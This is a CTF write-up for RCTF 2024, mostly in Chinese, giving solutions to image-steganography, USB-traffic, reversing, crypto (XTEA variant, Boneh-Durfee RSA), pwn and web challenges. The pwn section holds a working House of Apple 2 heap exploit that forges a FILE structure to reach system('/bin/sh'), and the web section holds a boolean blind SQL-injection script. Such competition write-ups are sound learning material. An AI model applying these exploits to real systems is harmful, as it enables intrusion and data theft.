---
title: 2024 RCTF writeup by Arr3stY0u
contest: RCTF
year: 2024
difficulty: hard
vuln_type: [stego_image, pwn_unknown, web_unknown, crypto_rsa, reverse, aes, ecdsa, block_cipher, lattice]
tags: [PNG列抽样拼接, USB键盘流量, pwncli 2048改分, House of Apple 2, AES-CBC, file_get_contents phar, Boneh-Durfee, XTEA delta=0x12345678, 32位虚拟机, 整数解 claripy, sbox置换]
attack_chain: 1. flag0-9.png 每张抽 1/2 列拼成 UUID / 2. 键盘流量 USB 还原命令 / 3. pwn 2048 模拟 BFS+1024 满行合并 / 4. pwn webp House of Apple 2 stderr _wide_data 劫持 system / 5. web 注入 '||love_key regexp binary 'x' / 6. crypto XTEA delta=0x12345678 + sbox 置换 / 7. 32 位 VM add/sub/xor hook 还原 / 8. Boneh-Durfee 大 e RSA / 9. 整数解 8 字节 claripy BVS 求多组方程 / 10. AES-128-CBC + str_rot13 + sbox
key_payload: RCTF{c4baf0eb-e5ca-543a-06d0-39d72325a0} ; niao ybufmefhui kjqillxdjwmi uizebuui ... ; _IO_wfile_jumps vtable + libc.system + chain ; Boneh-Durfee kd continued_fraction 还原 d ; XTEA delta=0x12345678
one_liner: UUID列抽样+键盘流量+pwn 2048+House of Apple 2+Boneh-Durfee+32位VM hook。
lesson: RCTF 风格综合：pwn 改分 + webp IO_FILE + crypto XTEA 变种 delta 全方位。
quality: high
---
# 2024 RCTF writeup by Arr3stY0u

## 1. flag0-9.png → UUID

```python
def read_and_write_pixels(input_path, output_path):
    img = Image.open(input_path)
    w, h = img.size
    new_img = Image.new(img.mode, (w//2, h))
    pixels = img.load()
    new_pixels = new_img.load()
    for x in range(0, w, 2):
        for y in range(h):
            new_pixels[x//2, y] = pixels[x, y]
    new_img.save(output_path)
```

每张图抽奇数/偶数列拼成 UUID 段：
```
flag0.png: RCTF
flag1.png: {c4b
flag2.png: af0e
flag3.png: b-e5
...
flag9.png: 5a0}
RCTF{c4baf0eb-e5ca-543a-06d0-39d72325a0}
```

## 2. 键盘流量

```
niuo<SPACE>ybufmefhui<SPACE>kjqillxdjwmi<SPACE>uizebuui<SPACE><RET>
dvoo<SPACE><RET>udpn<SPACE>uibuui<SPACE>jqybdm<SPACE>vegeyisi<SPACE>...
```

## 3. RCTF{CAWCAW1Kaka}（Java 整数 XOR）

```python
a = [164, 158, 95, 107, 4, 215, 108, 115, 5, 8, 25, 57, 41, 236, 231, 17, 85]
b = [246, 221, 11, 45, 127, 148, 45, 36, 70, 73, 78, 8, 98, 141, 140, 112, 40]
str2 = ''
for b2 in range(len(a)):
    str2 += chr(a[b2] ^ b[b2])
print(str2)  # RCTF{CAWCAW1Kaka}
```

## 4. PWN 2048 改分

```python
def move_left(board): ...
def move_right(board): return np.array([row[::-1] for row in move_left(board[::-1])])
def move_up(board): return move_left(board.T).T
def move_down(board): return move_right(board.T).T
def heuristic_score(board):
    empty = len(np.where(board == 0)[0])
    max_tile = np.max(board)
    return empty + np.log2(max_tile)
def get_best_move(board):
    moves = {'a': move_left, 'd': move_right, 'w': move_up, 's': move_down}
    ...
    return best_move
def ready2win(board):  # 1024 触发 win
    for y in range(4):
        for x in range(4):
            if board[y][x] == 1024:
                if check_around(board, x, y, ...): return True, 'd'
```

500 局自动玩 → 触发 `to win: <score>` 改 score 越权。

## 5. PWN webp feedback（House of Apple 2）

```python
# feedback 系统 webp 解析触发 IO
add_feedback(1, 0x4180, b'stas')
add_feedback(2, 0x20, b'stas')
delete_feedback(2); add_feedback(2, 0x10, b'stas')
delete_feedback(1); add_feedback(1, 0x4180, b'stas')
show_feedback(1)  # 泄露 libc
set_current_libc_base_and_log(recv_current_libc_addr(), 0x21ace0)
# overwrite size
edit_feedback(2, p64(0x21)*6 + p64(libc.sym['_IO_2_1_stderr_']) + p64(0x1000))
# fake IO with system
f = FileStructure()
f.flags = u64(" sh;")
f._IO_read_ptr = 0
f._IO_read_base = libc.sym['system']
f._lock = libc.symbols['_IO_2_1_stderr_'] - 0x10
f._codecvt = libc.symbols['_IO_2_1_stderr_']
f.chain = libc.sym['system']
f._wide_data = libc.symbols['_IO_2_1_stderr_'] - 0x48
f.vtable = p64(libc.symbols['_IO_wfile_jumps'])
edit_feedback(1, bytes(f))
```

走 `_IO_wfile_jumps` vtable 触发 `__doallocate` → system("/bin/sh")。

## 6. Web key1 SQL 盲注

```python
import requests
payload = "'||love_key regexp binary '{}';-- "
flag = 'RCTF{THE_FIRST_STEP_IS_TO_GET_TO_KNOW'
for i in range(1, 20):
    for c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZ_':
        r = requests.post('http://.../key1', data={'key1[]': payload.format(flag+c)})
        if 'success' in r.text:
            flag += c
            break
```

regexp binary 布尔盲注 + 数组传参绕单值校验。

## 7. Crypto XTEA delta=0x12345678

```python
from ctypes import c_uint32
key1 = [3540658286, 3391361277, 1321275334, 3918321625]
key2 = [1272471749, 2262110437, 697301573, 1088211398]
delta = 0x12345678

def tea_dec(v, key):
    y, z = c_uint32(v[0]), c_uint32(v[1])
    _sum = c_uint32(delta * 32)
    for i in range(32):
        z.value -= ((y.value<<4)+key[2]) ^ (y.value+_sum.value) ^ ((y.value>>5)+key[3])
        _sum.value -= delta
        y.value -= ((z.value<<4)+key[0]) ^ (z.value+_sum.value) ^ ((z.value>>5)+key[1])
    return [y.value, z.value]

enc = [1386864498, 2877138732, ...]
pt = b''
for i in range(0, len(enc), 2):
    v0, v1 = tea_dec(enc[i:i+2], key2)
    v0, v1 = tea_dec([v0, v1], key1)
    pt += struct.pack('<2I', v0, v1)
sbox = [12, 17, 10, 6, 5, 27, 31, 15, 11, 8, 13, 21, 24, 1, 26, 22, ...]
# pt 按 sbox 索引置换
```

## 8. 32 位虚拟机（IDA hook 弹栈）

自定义 VM 指令：putchar/getchar/shlshr/or/and/xor/sub/add/dup/pop/push。IDA Python 跑 hook 函数看每步加/减/异或：
```
0x00000000+0x9E3779B9=0x9E3779B9 sum
0x31313131^0x9E3779B9=0xAF064888 t0 = inp[(j+1)%8]^sum
0xAF064888+0x547FA369=0x0385EBF1 t1 = t0+keys[j]
0xB9B9B9B8^0x0385EBF1=0xBA3C5249 t2 = (inp[(j+7)%8]<<3)^t1
```

## 9. 整数解（claripy BVS）

```python
import claripy
inp = [claripy.BVS(f"inp_{i}", 64) for i in range(3)]
v23 = inp[0]; v24 = inp[1]; v25 = inp[2]
v20 = (v24 & v23)
v19 = ((v24 & v23 | v25 & v23) + 65670)
v18 = ((v25 & v23 ^ v25 & v24) - 1131796)
v17 = (v24 & v23 ^ v25 & v23)
s = claripy.Solver()
s.add((v23 ^ (v20 & ~v18 | ...)) == 0x400010000622000)
s.add((v18 ^ (v19 - v20)) == 0x2100A0203EFBB8B)
s.add((v23 - v24) == 0x1AEFF6FDFC121BF1)
s.add((v25 + v24 + v23) % 10 == 8)
# 限制每字节 65-125
for i in range(len(inp)):
    for j in range(8):
        s.add((inp[i] >> (j*8)) & 0xff <= 125)
        s.add((inp[i] >> (j*8)) & 0xff >= 65)
print(s.check_satisfiability())
```

7 个方程 + 3 个 64-bit BVS + 字符约束，Z3 几秒解出。

## 10. Boneh-Durfee 大 e RSA

```python
for kd in continued_fraction(e/(n - isqrt(i/j*n) - isqrt(j/i*n) + 1)).convergents():
    tk = kd.numerator()
    td = kd.denominator()
    if int(pow(2, e*td, n)) == 2:
        print("[+] Success !"); print("d =", td); return td
```

`attack_rsa_with_small_prime_comb_and_small_pri(i, j, e, n)` 枚举 (i, j) 比例 → continued_fraction 收敛子找 d。
